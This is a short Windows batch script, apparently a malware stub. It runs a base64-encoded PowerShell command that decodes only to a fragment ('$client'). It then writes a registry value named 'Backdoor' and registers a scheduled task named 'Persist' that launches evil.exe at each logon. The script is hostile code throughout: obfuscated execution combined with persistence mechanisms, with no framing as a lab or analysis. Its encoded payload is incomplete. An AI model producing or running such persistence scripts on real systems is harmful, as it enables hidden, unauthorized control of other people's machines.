@echo off
powershell -enc JABjAGwAaQBlAG4AdAA=
reg add HKCU\Software\Evil /v Backdoor /d 1
schtasks /create /tn Persist /tr evil.exe /sc onlogon